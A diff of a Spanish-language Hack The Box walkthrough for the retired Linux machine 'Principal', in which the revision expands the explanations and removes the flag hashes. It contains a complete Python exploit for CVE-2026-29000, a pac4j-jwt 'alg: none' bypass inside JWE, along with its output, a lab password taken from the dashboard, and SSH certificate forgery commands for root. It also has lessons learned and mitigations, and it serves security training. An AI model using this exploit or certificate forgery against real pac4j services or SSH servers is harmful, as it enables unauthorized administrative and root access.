@@ -2,19 +2,21 @@
 title: "HTB Walkthrough: Principal"
 date: 2026-04-14
 draft: false
-description: "Walkthrough completo de la máquina Principal de Hack The Box. Dificultad Medium, OS Linux (Ubuntu 24.04 LTS)."
-tags: ["HackTheBox", "Linux", "Medium", "JWT", "SSH", "CVE-2026-29000"]
+description: "Walkthrough completo de la máquina Principal de Hack The Box. Dificultad Medium, OS Linux (Ubuntu 24.04 LTS). CVE-2026-29000 JWT bypass, credenciales expuestas y escalada por SSH Certificate Forgery."
+tags: ["HackTheBox", "Linux", "Medium", "JWT", "JWE", "SSH", "CVE-2026-29000", "pac4j", "PrivEsc", "CertificateForge", "principal", "writeups"]
 categories: ["HTB Walkthroughs"]
 series: ["HackTheBox CPTS"]
 ---
 
 {{< lead >}}
-Resolución paso a paso de **Principal** en Hack The Box. Máquina de dificultad **Medium** con sistema operativo **Linux (Ubuntu 24.04 LTS)**. Cubrimos bypass de autenticación JWT, extracción de credenciales desde dashboard y escalada de privilegios mediante forja de certificados SSH.
+Resolución paso a paso de **Principal** en Hack The Box. Máquina de dificultad **Medium** con sistema operativo **Linux (Ubuntu 24.04 LTS)**. Encadenamos un bypass de autenticación JWT mediante CVE-2026-29000, extracción de credenciales desde un dashboard administrativo y escalada de privilegios a root forjando un certificado SSH con la CA privada del servidor.
 {{< /lead >}}
 
 {{< badge >}}HackTheBox{{< /badge >}}
 {{< badge >}}Linux{{< /badge >}}
 {{< badge >}}Medium{{< /badge >}}
+
+> ⚠️ **Esta máquina está retirada.** Los writeups públicos solo están permitidos sobre máquinas retiradas según las [normas de la comunidad HTB](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines).
 
 ---
 
@@ -26,13 +28,13 @@ Resolución paso a paso de **Principal** en Hack The Box. Máquina de dificultad
 | **OS**         | Linux (Ubuntu 24.04 LTS)                                             |
 | **Dificultad** | Medium                                                               |
 | **IP**         | 10.129.244.220                                                       |
-| **Técnicas**   | CVE-2026-29000 (pac4j-jwt PlainJWT Bypass), SSH Certificate Forgery |
+| **Técnicas**   | CVE-2026-29000 · PlainJWT Bypass · SSH Certificate Forgery · Credential Exposure |
 
 ---
 
-## 🔎 Reconocimiento
+## 1. Reconocimiento
 
-### Escaneo de Puertos — Descubrimiento Inicial
+### 1.1 Escaneo de Puertos
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.244.220
@@ -44,7 +46,7 @@ PORT     STATE SERVICE
 8080/tcp open  http-proxy
 ```
 
-### Escaneo de Versiones y Scripts
+Solo dos puertos. Lanzamos un escaneo de versiones sobre ellos:
 
 ```bash
 nmap -sC -sV -p22,8080 10.129.244.220
@@ -60,24 +62,23 @@ PORT     STATE SERVICE    VERSION
 ```
 
 *Puertos abiertos:*
-- `22` → `OpenSSH 9.6p1`
-- `8080` → `Jetty (pac4j-jwt/6.0.3)`
+- `22` → OpenSSH 9.6p1 (sin CVEs relevantes — destino final, no punto de entrada)
+- `8080` → Jetty con **pac4j-jwt/6.0.3**
 
-> **💡 Datos clave del escaneo:** Puerto 8080 aloja una aplicación web Java sobre **Jetty** autenticada con **pac4j-jwt versión 6.0.3**. La cabecera `X-Powered-By` nos da la librería y su versión exacta, pista directa para buscar CVEs.
+> **💡 Dato clave:** La cabecera `X-Powered-By: pac4j-jwt/6.0.3` es information disclosure — revela la librería de autenticación y su versión exacta, lo que nos permite buscar CVEs directamente. Siempre revisar las cabeceras HTTP de respuesta durante la enumeración.
 
-### Enumeración Web — Análisis del Frontend
+### 1.2 Enumeración Web
 
-La página principal muestra un formulario de login corporativo. El archivo `/static/js/app.js` revela la arquitectura de autenticación:
+Navegamos a `http://10.129.244.220:8080` y encontramos un formulario de login corporativo. Sin credenciales, pasamos a analizar lo que está disponible públicamente.
+
+Los archivos JS del lado del cliente son una fuente de inteligencia importante: los desarrolladores frecuentemente dejan endpoints, estructuras de datos y comentarios que describen la arquitectura interna. El archivo `/static/js/app.js` revela todo lo que necesitamos:
 
 ```js
-// Endpoints disponibles
 const JWKS_ENDPOINT      = '/api/auth/jwks';  // Clave pública RSA — acceso público
 const AUTH_ENDPOINT      = '/api/auth/login';
 const DASHBOARD_ENDPOINT = '/api/dashboard';
-const USERS_ENDPOINT     = '/api/users';
 const SETTINGS_ENDPOINT  = '/api/settings';
 
-// Roles del sistema
 const ROLES = {
     ADMIN:   'ROLE_ADMIN',
     MANAGER: 'ROLE_MANAGER',
@@ -95,81 +96,109 @@ const ROLES = {
 //   iss  - "principal-platform"
 ```
 
-> **💡 Conclusiones del análisis:**
-> 1. El sistema usa **JWE** — el token está cifrado con la clave pública RSA del servidor.
-> 2. Dentro del JWE hay un **JWT** firmado con RS256.
-> 3. La **clave pública** está disponible sin autenticación en `/api/auth/jwks`.
-> 4. El campo `role` en los claims controla el acceso — si lo falsificamos, podemos escalar a `ROLE_ADMIN`.
+### 1.3 Arquitectura de Autenticación
+
+El sistema usa **JWE** (JSON Web Encryption), que es un JWT cifrado. La estructura es:
+
+```
+JWE (capa externa — cifrado RSA-OAEP-256 con clave pública del servidor)
+  └── JWT firmado con RS256 (capa interna — los claims reales: usuario, rol, etc.)
+```
+
+Esto implica dos operaciones separadas: primero el servidor descifra el JWE, luego verifica la firma del JWT interior. Esta separación es exactamente lo que el CVE va a explotar.
+
+La clave pública RSA está disponible sin autenticación en `/api/auth/jwks`:
+
+```bash
+curl http://10.129.244.220:8080/api/auth/jwks
+```
+
+```json
+{
+  "keys": [{ "kty": "RSA", "use": "enc", "kid": "enc-key-1", "n": "0vx7ago...", "e": "AQAB" }]
+}
+```
+
+Esta clave nos permite cifrar nosotros mismos la capa JWE — el servidor podrá descifrarla (tiene la clave privada), pero el JWT que metamos dentro estará bajo nuestro control.
+
+> **💡 Conclusiones:** Tenemos la clave pública RSA para cifrar tokens, conocemos la estructura exacta de los claims y sabemos que el campo `role` controla el acceso. Si logramos que el servidor acepte un token con `ROLE_ADMIN` sin verificar la firma del JWT interior, tenemos acceso total.
 
 ---
 
-## 🚪 Foothold / Explotación
+## 2. Explotación — CVE-2026-29000
 
-### Identificación de la Vulnerabilidad — CVE-2026-29000
+### 2.1 Análisis de la Vulnerabilidad
 
-La versión **pac4j-jwt 6.0.3** es vulnerable al **CVE-2026-29000**, que afecta a versiones anteriores a 4.5.9, 5.7.9 y 6.3.3.
+La versión **pac4j-jwt 6.0.3** es vulnerable a este CVE (afecta versiones anteriores a 4.5.9, 5.7.9 y 6.3.3). El fallo está en cómo pac4j procesa los tokens JWE cuando el JWT interno es un **PlainJWT** (`"alg": "none"` — sin firma).
 
-El fallo reside en cómo pac4j procesa los tokens JWE cuando el contenido interno es un **PlainJWT** (`"alg": "none"`).
+**¿Cómo funciona el ataque?**
 
-**Flujo normal:**
+En condiciones normales, pac4j descifra el JWE y luego verifica la firma del JWT interno. El bug ocurre cuando el JWT interior tiene `alg: none`: la función `toSignedJWT()` devuelve `null` en lugar de lanzar una excepción, y el código que la llama no comprueba ese `null` antes de continuar. El resultado es que pac4j extrae los claims del PlainJWT **sin haber verificado ninguna firma**, aceptando cualquier `role` que el atacante haya puesto.
+
 ```
-JWE (cifrado RSA-OAEP-256) → contiene → JWT firmado RS256 → claims verificados
-```
-
-**Flujo malicioso:**
-```
-JWE (cifrado con clave pública del servidor) → contiene → PlainJWT ("alg":"none") → claims aceptados sin verificar firma
+Flujo normal:    JWE válido → JWT firmado RS256 → verificar firma → extraer claims
+Flujo malicioso: JWE válido → PlainJWT (alg:none) → toSignedJWT() = null → claims aceptados sin verificación
 ```
 
-pac4j descifra el JWE correctamente, pero cuando el JWT interno tiene `"alg": "none"`, la función `toSignedJWT()` devuelve `null` en lugar de lanzar un error. El código vulnerable acepta ese `null` como válido y extrae los claims del PlainJWT **sin verificar ninguna firma**, permitiendo al atacante fijar el `role` que quiera.
+La clave del bypass: ciframos la capa JWE con la **clave pública real del servidor**, así que el descifrado externo es completamente válido. El problema está en el interior.
 
-### Script de Explotación
+### 2.2 Script de Explotación
+
+Exploit disponible en: [CVE-2026-29000 PoC](https://github.com/advisories/CVE-2026-29000)
+
+```bash
+pip install jwcrypto requests
+```
 
 ```python
 #!/usr/bin/env python3
+"""
+CVE-2026-29000 — pac4j-jwt PlainJWT Authentication Bypass
+Uso: python3 cve.py http://10.129.244.220:8080
+"""
+
 import json, time, base64, requests, sys
 from jwcrypto import jwk, jwe
-
-if len(sys.argv) < 2:
-    print(f"Uso: python3 {sys.argv[0]} <URL_BASE>")
-    sys.exit(1)
 
 TARGET_URL         = sys.argv[1].rstrip('/')
 JWKS_ENDPOINT      = f"{TARGET_URL}/api/auth/jwks"
 PROTECTED_ENDPOINT = f"{TARGET_URL}/api/dashboard"
 
 def b64_encode(data):
+    # Base64 URL-safe sin padding — formato requerido por el estándar JWT
     return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
 
-# 1. Obtener la clave pública RSA desde el endpoint público
+# 1. Obtener la clave pública RSA del endpoint público
 print(f"[*] Obteniendo clave pública de {JWKS_ENDPOINT}...")
 r = requests.get(JWKS_ENDPOINT, timeout=10)
 key_data   = r.json()['keys'][0]
 public_key = jwk.JWK(**key_data)
-print(f"[+] Clave RSA '{key_data.get('kid')}' cargada correctamente.")
+print(f"[+] Clave RSA '{key_data.get('kid')}' cargada.")
 
-# 2. Construir los claims maliciosos con ROLE_ADMIN
+# 2. Claims maliciosos con ROLE_ADMIN
 now = int(time.time())
 claims = {
     "sub":  "admin#override",
-    "role": "ROLE_ADMIN",         # Claim de privilegio máximo
-    "iss":  "principal-platform",
+    "role": "ROLE_ADMIN",           # El claim que nos da acceso total
+    "iss":  "principal-platform",   # Debe coincidir con lo que espera el servidor
     "iat":  now,
     "exp":  now + 3600
 }
 
 # 3. Construir el PlainJWT (alg: none — sin firma)
+# Formato: base64(header).base64(payload).
+# El punto final vacío indica ausencia de firma
 header_plain     = b64_encode(json.dumps({"alg": "none"}).encode())
 payload_plain    = b64_encode(json.dumps(claims).encode())
 plain_jwt_string = f"{header_plain}.{payload_plain}."
-print("[*] PlainJWT (sin firma) generado.")
 
-# 4. Envolver el PlainJWT en un JWE cifrado con la clave pública del servidor
-print("[*] Cifrando payload con RSA-OAEP-256...")
+# 4. Envolver el PlainJWT en un JWE cifrado con la clave pública real del servidor
+# La capa exterior es criptográficamente válida — el servidor puede descifrarla.
+# Pero el JWT interior no tiene firma: aquí está el bypass.
 jwe_header = {
     "alg": "RSA-OAEP-256",
     "enc": "A256GCM",
-    "cty": "JWT",
+    "cty": "JWT",           # Indica al servidor que el contenido descifrado es un JWT
     "kid": key_data.get('kid')
 }
 jwe_obj = jwe.JWE(
@@ -178,24 +207,20 @@ jwe_obj = jwe.JWE(
     protected=json.dumps(jwe_header)
 )
 malicious_token = jwe_obj.serialize(compact=True)
-print("[+] Token JWE final generado.")
+print("[+] Token JWE malicioso generado.")
 
 # 5. Enviar el token al endpoint protegido
-print(f"[*] Enviando ataque a {PROTECTED_ENDPOINT}...")
 headers = {"Authorization": f"Bearer {malicious_token}"}
 resp    = requests.get(PROTECTED_ENDPOINT, headers=headers)
 
-print("\n[!] COPIA ESTE TOKEN PARA EL NAVEGADOR:")
-print(malicious_token)
-
-print("\n--- [ RESULTADO DEL SERVIDOR ] ---")
-print(f"Status Code: {resp.status_code}")
+print(f"\n[!] TOKEN PARA EL NAVEGADOR:\n{malicious_token}\n")
+print(f"Status: {resp.status_code}")
 if resp.status_code == 200:
-    print("[!!!] BYPASS EXITOSO: Acceso concedido como ADMIN.")
-    print(f"Respuesta: {resp.text}")
-else:
-    print(f"[-] Acceso denegado. Código: {resp.status_code}")
+    print("[!!!] BYPASS EXITOSO — Acceso como ADMIN")
+    print(resp.text)
 ```
+
+### 2.3 Ejecución
 
 ```bash
 python3 cve.py http://10.129.244.220:8080
@@ -203,18 +228,14 @@ python3 cve.py http://10.129.244.220:8080
 
 ```
 [*] Obteniendo clave pública de http://10.129.244.220:8080/api/auth/jwks...
-[+] Clave RSA 'enc-key-1' cargada correctamente.
-[*] PlainJWT (sin firma) generado.
-[*] Cifrando payload con RSA-OAEP-256...
-[+] Token JWE final generado.
-[*] Enviando ataque a http://10.129.244.220:8080/api/dashboard...
+[+] Clave RSA 'enc-key-1' cargada.
+[+] Token JWE malicioso generado.
 
---- [ RESULTADO DEL SERVIDOR ] ---
-Status Code: 200
-[!!!] BYPASS EXITOSO: Acceso concedido como ADMIN.
+Status: 200
+[!!!] BYPASS EXITOSO — Acceso como ADMIN
 ```
 
-La respuesta JSON del dashboard incluye el log de actividad del sistema. Entre las entradas aparece un dato relevante:
+La respuesta del dashboard incluye el log de actividad del sistema. Entre las entradas encontramos:
 
 ```json
 {
@@ -225,19 +246,17 @@ La respuesta JSON del dashboard incluye el log de actividad del sistema. Entre l
 }
 ```
 
-### Acceso al Dashboard desde el Navegador
+El usuario `svc-deploy` gestiona autenticación SSH mediante certificados — candidato directo para el acceso inicial.
 
-Para navegar por la interfaz completa como administrador, inyectamos el token en el Session Storage:
+### 2.4 Acceso al Dashboard desde el Navegador
 
-1. Abrir `http://10.129.244.220:8080/login` en el navegador
-2. Abrir DevTools → **F12**
-3. Ir a **Storage** → **Session Storage** → `http://10.129.244.220:8080`
-4. Crear una entrada nueva:
-   - **Key:** `auth_token`
-   - **Value:** (pegar el token generado por el script)
-5. Navegar a `http://10.129.244.220:8080/dashboard`
+Para explorar la interfaz como administrador, inyectamos el token en el Session Storage del navegador (donde la aplicación SPA almacena el token de sesión):
 
-En la sección **Settings** del dashboard encontramos credenciales expuestas en texto claro:
+1. Abrir `http://10.129.244.220:8080/login` → **F12** → **Application** → **Session Storage**
+2. Crear entrada: **Key** `auth_token` / **Value** (pegar el token del script)
+3. Navegar a `http://10.129.244.220:8080/dashboard`
+
+En la sección **Settings** encontramos credenciales del sistema en texto claro:
 
 ```
 encryptionKey: D3pl0y_$$H_Now42!
@@ -245,12 +264,11 @@ sshCertAuth:   enabled
 sshCaPath:     /opt/principal/ssh/
 ```
 
-> **🔑 Credencial encontrada:** `D3pl0y_$$H_Now42!`
-> Cruzando con el usuario `svc-deploy` del log de actividad, tenemos unas credenciales SSH directas.
+> **🔑 Cruzando el usuario `svc-deploy` del log con la contraseña del Settings, tenemos credenciales SSH directas.**
 
 ---
 
-## 🔑 User Flag
+## 3. User Flag
 
 ```bash
 ssh svc-deploy@10.129.244.220
@@ -266,25 +284,23 @@ svc-deploy@principal:~$
 svc-deploy@principal:~$ cat user.txt
 ```
 
-{{< spoiler text="user.txt" >}}
-`5516b5748a367aab31076adfd86560bc`
-{{< /spoiler >}}
+> 🔑 Flag de usuario obtenida.
 
 ---
 
-## 👑 Escalada de Privilegios (PrivEsc)
+## 4. Escalada de Privilegios
 
-### Enumeración del Sistema
+### 4.1 Enumeración del Sistema
 
 ```bash
 svc-deploy@principal:~$ sudo -l
 Sorry, user svc-deploy may not run sudo on principal.
 
-svc-deploy@principal:~$ groups
-svc-deploy deployers
+svc-deploy@principal:~$ id
+uid=1001(svc-deploy) gid=1001(svc-deploy) groups=1001(svc-deploy),1002(deployers)
 ```
 
-Sin `sudo`. Buscamos qué archivos son accesibles para el grupo `deployers`:
+Sin `sudo`, pero el usuario pertenece al grupo `deployers`. Buscamos qué recursos son accesibles para ese grupo:
 
 ```bash
 svc-deploy@principal:~$ find / -group deployers 2>/dev/null
@@ -294,25 +310,14 @@ svc-deploy@principal:~$ find / -group deployers 2>/dev/null
 /etc/ssh/sshd_config.d/60-principal.conf
 /opt/principal/ssh
 /opt/principal/ssh/README.txt
-/opt/principal/ssh/ca          ← CA privada de SSH accesible para nuestro grupo
+/opt/principal/ssh/ca          ← Clave privada de la CA de SSH
 ```
 
-### Análisis de la Configuración SSH
+El archivo `/opt/principal/ssh/ca` es una **clave privada de Autoridad Certificadora SSH** accesible para nuestro grupo. Esto es crítico.
 
-```bash
-svc-deploy@principal:~$ cat /opt/principal/ssh/README.txt
-```
+### 4.2 Análisis de la Configuración SSH
 
-```
-CA keypair for SSH certificate automation.
-
-This CA is trusted by sshd for certificate-based authentication.
-Use deploy.sh to issue short-lived certificates for service accounts.
-
-Algorithm: RSA 4096-bit
-Created: 2025-11-15
-Purpose: Automated deployment authentication
-```
+SSH puede autenticar usuarios mediante **certificados** firmados por una CA. El servidor define en su configuración qué CA es de confianza, y acepta la conexión de cualquier usuario cuyo certificado haya sido firmado por ella. Quien controle la clave privada de la CA puede firmar certificados para **cualquier usuario del sistema**, incluyendo `root`.
 
 ```bash
 svc-deploy@principal:~$ cat /etc/ssh/sshd_config.d/60-principal.conf
@@ -325,21 +330,22 @@ PermitRootLogin prohibit-password
 TrustedUserCAKeys /opt/principal/ssh/ca.pub
 ```
 
-**¿Por qué es esto explotable?**
+- **`TrustedUserCAKeys /opt/principal/ssh/ca.pub`** → El servidor confía en cualquier certificado firmado por esta CA. Tenemos lectura sobre la clave privada correspondiente.
+- **`PermitRootLogin prohibit-password`** → Root no puede autenticarse con contraseña, pero **sí puede con certificado**.
 
-La configuración tiene una **misconfiguration crítica**: `TrustedUserCAKeys` está definido, pero **no hay ningún `AuthorizedPrincipalsFile` configurado**. Cuando OpenSSH usa `TrustedUserCAKeys` sin `AuthorizedPrincipalsFile`, acepta cualquier certificado firmado por la CA de confianza siempre que el principal del certificado coincida con el usuario al que se conecta.
+La misconfiguration crítica es la **ausencia de `AuthorizedPrincipalsFile`**. Sin ella, el único control de acceso es que el *principal* del certificado (el campo que declara "este certificado es para el usuario X") coincida con el usuario al que se intenta conectar. No hay ninguna lista que limite qué principales son válidos para cada cuenta — si firmamos un certificado con `root` como principal, SSH lo acepta.
 
-Además, `PermitRootLogin prohibit-password` bloquea el login de root por contraseña, pero **permite login por certificado**. Como tenemos acceso de lectura a la CA privada en `/opt/principal/ssh/ca`, podemos firmar un certificado con `root` como principal.
+> **💡 El mismo patrón que el CVE:** el sistema verifica la envoltura criptográfica (el certificado está firmado por la CA de confianza), pero no controla la afirmación de identidad interior (el principal del certificado). En ambos vectores de esta máquina, verificar la capa exterior da una falsa sensación de seguridad.
 
-> **💡 El paralelismo con el foothold:** La misma clase de vulnerabilidad que el CVE-2026-29000 — el sistema verifica la envoltura criptográfica (el certificado está firmado por la CA de confianza), pero el atacante controla la afirmación de identidad (el principal del certificado).
+### 4.3 Forja del Certificado SSH
 
-### Explotación — Forja de Certificado SSH
-
-**Paso 1 — Generar un nuevo par de claves en `/tmp`:**
+**Paso 1 — Generar un par de claves temporal:**
 
 ```bash
 svc-deploy@principal:/tmp$ ssh-keygen -t ed25519 -f /tmp/paw -N ""
 ```
+
+Generamos las claves en `/tmp` con passphrase vacía para no necesitar interacción.
 
 **Paso 2 — Firmar la clave pública con la CA privada, especificando `root` como principal:**
 
@@ -351,15 +357,14 @@ svc-deploy@principal:/tmp$ ssh-keygen -s /opt/principal/ssh/ca \
     /tmp/paw.pub
 ```
 
+- **`-s /opt/principal/ssh/ca`** → Clave privada de la CA. Sin este archivo, la escalada sería imposible.
+- **`-I "pwa-root"`** → Identificador del certificado (arbitrario, aparece en logs).
+- **`-n root`** → **El principal del certificado.** Declara que este certificado autoriza el acceso a `root`. Sin `AuthorizedPrincipalsFile`, SSH acepta esta declaración sin restricciones adicionales.
+- **`-V +1h`** → Validez de 1 hora.
+
 ```
 Signed user key /tmp/paw-cert.pub: id "pwa-root" serial 0 for root valid from 2026-04-14T09:51:00 to 2026-04-14T10:51:59
 ```
-
-> **Parámetros:**
-> - `-s /opt/principal/ssh/ca` → Clave privada de la CA
-> - `-I "pwa-root"` → Identificador del certificado (arbitrario)
-> - `-n root` → **Principal del certificado** — el usuario al que da acceso
-> - `-V +1h` → Validez de 1 hora
 
 **Paso 3 — Verificar el certificado:**
 
@@ -375,17 +380,21 @@ svc-deploy@principal:/tmp$ ssh-keygen -L -f /tmp/paw-cert.pub
         Valid: from 2026-04-14T09:51:00 to 2026-04-14T10:51:59
         Principals:
                 root
-        Critical Options: (none)
         Extensions:
                 permit-pty
                 permit-port-forwarding
+                ...
 ```
 
-**Paso 4 — Conectarse como root usando el certificado:**
+El certificado está firmado por la CA correcta y declara `root` como principal.
+
+**Paso 4 — Conectarse como root:**
 
 ```bash
 svc-deploy@principal:/tmp$ ssh -i /tmp/paw root@localhost
 ```
+
+SSH detecta automáticamente el certificado `/tmp/paw-cert.pub`. El servidor verifica que está firmado por la CA de confianza, que el principal `root` coincide con el usuario solicitado, y abre la sesión.
 
 ```
 Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
@@ -396,54 +405,49 @@ root@principal:~#
 
 ---
 
-## 🏁 Root Flag
+## 5. Root Flag
 
 ```bash
 root@principal:~# cat /root/root.txt
 ```
 
-{{< spoiler text="root.txt" >}}
-`6c6f21dacd5682a3cf56a7193be5f550`
-{{< /spoiler >}}
+> 🏁 Flag de root obtenida.
 
 ---
 
-## 📝 Resumen y Lecciones Aprendidas
+## 6. Resumen y Lecciones Aprendidas
 
 **Ruta de compromiso:**
 
-```
-Puerto 8080 → pac4j-jwt 6.0.3 (CVE-2026-29000)
-        ↓
-/api/auth/jwks → Clave pública RSA obtenida sin autenticación
-        ↓
-PlainJWT ("alg":"none") + ROLE_ADMIN envuelto en JWE válido
-        ↓
-Bypass de autenticación → Acceso como ROLE_ADMIN al dashboard
-        ↓
-Settings → encryptionKey: D3pl0y_$$H_Now42! + usuario svc-deploy (del log)
-        ↓
-SSH como svc-deploy → grupo deployers → /opt/principal/ssh/ca (clave CA privada)
-        ↓
-ssh-keygen -s ca -n root → Certificado SSH forjado con principal=root
-        ↓
-ssh -i /tmp/paw root@localhost → Shell como root
-```
+1. **Recon** → `X-Powered-By: pac4j-jwt/6.0.3` — information disclosure directo a CVE.
+2. **Enumeración web** → JS del frontend revela arquitectura JWE/JWT, endpoint JWKS público y estructura de claims.
+3. **CVE-2026-29000** → PlainJWT (`alg:none`) dentro de JWE válido bypasea la verificación de firma → `ROLE_ADMIN`.
+4. **Dashboard** → Log revela usuario `svc-deploy`; Settings expone contraseña en texto claro.
+5. **Foothold** → SSH con credenciales directas → `user.txt`.
+6. **PrivEsc** → Grupo `deployers` tiene lectura sobre la CA privada SSH + `TrustedUserCAKeys` sin `AuthorizedPrincipalsFile` → certificado forjado con principal `root` → `root.txt`.
 
 **Lo que aprendí con esta máquina:**
 
-- El header `X-Powered-By` puede revelar librerías y versiones exactas — siempre revisarlo durante la enumeración web.
-- El CVE-2026-29000 explota que pac4j acepta PlainJWT (`alg: none`) dentro de un JWE válido, bypassando completamente la verificación de firma del JWT interno.
-- `TrustedUserCAKeys` sin `AuthorizedPrincipalsFile` es una misconfiguration crítica: permite forjar acceso a cualquier usuario del sistema con solo tener acceso a la CA privada.
-- `PermitRootLogin prohibit-password` no protege contra autenticación por certificado.
+- **Las cabeceras HTTP revelan mucho.** `X-Powered-By` con versión exacta es el punto de partida de toda la cadena. Siempre revisar las cabeceras de respuesta durante la enumeración.
+
+- **El JS del frontend no es decoración.** Los comentarios del desarrollador describían la arquitectura entera de autenticación. Todo lo que se sirve al navegador puede leerlo el atacante.
+
+- **CVE-2026-29000: el principio "fail securely".** El bug no es criptográfico — RSA-OAEP y AES-GCM son seguros. El fallo es que `toSignedJWT()` devuelve `null` silenciosamente ante un PlainJWT en lugar de lanzar excepción. Un sistema seguro debe denegar el acceso ante cualquier condición anómala, nunca concederlo por defecto.
+
+- **`TrustedUserCAKeys` sin `AuthorizedPrincipalsFile` es una bomba de tiempo.** La primera directiva define quién puede firmar certificados de confianza; la segunda limita qué identidades son válidas para cada usuario. Sin la segunda, cualquiera con la CA privada puede acceder como cualquier usuario del sistema.
+
+- **`PermitRootLogin prohibit-password` no protege contra certificados.** Solo bloquea fuerza bruta de contraseñas. La protección correcta es `PermitRootLogin no` + `sudo` auditado.
+
+- **Los secretos nunca deben estar en la UI.** La contraseña visible en el Settings del dashboard es el error que convierte el bypass de auth en acceso completo al sistema. Los secretos deben vivir en un vault (HashiCorp Vault, AWS Secrets Manager), nunca en la base de datos de la aplicación.
 
 **Mitigaciones:**
 
 | Vector | Mitigación |
 |--------|------------|
-| CVE-2026-29000 (PlainJWT bypass) | Actualizar pac4j-jwt a ≥ 6.3.3; rechazar explícitamente tokens con `alg: none` |
-| Clave pública RSA sin autenticación | Proteger `/api/auth/jwks` o limitarlo por IP |
-| Credenciales en texto claro en el dashboard | No almacenar secretos en la base de datos accesibles desde la UI |
-| CA privada accesible al grupo `deployers` | Usar un HSM o vault; el archivo `ca` no debe ser legible por usuarios de servicio |
-| `TrustedUserCAKeys` sin `AuthorizedPrincipalsFile` | Configurar `AuthorizedPrincipalsFile` para limitar los principals válidos por usuario |
-| `PermitRootLogin` con certificados activo | Usar `PermitRootLogin no` y gestionar acceso root con `sudo` desde cuentas auditadas |
+| Information disclosure (`X-Powered-By`) | Eliminar o generalizar cabeceras que revelan tecnología y versión |
+| CVE-2026-29000 (PlainJWT bypass) | Actualizar pac4j-jwt a ≥ 6.3.3; rechazar `alg: none` explícitamente |
+| JWKS sin restricciones | Proteger `/api/auth/jwks` por IP o con autenticación |
+| Credenciales en texto claro en la UI | Usar un gestor de secretos; nunca exponer valores en la interfaz |
+| CA privada legible por grupo de servicio | Almacenar en HSM o vault; sin permisos de lectura para cuentas de servicio |
+| `TrustedUserCAKeys` sin `AuthorizedPrincipalsFile` | Configurar `AuthorizedPrincipalsFile` limitando principals por usuario; sin principals válidos para `root` |
+| `PermitRootLogin prohibit-password` | Cambiar a `PermitRootLogin no` + gestión de acceso root mediante `sudo` auditado |
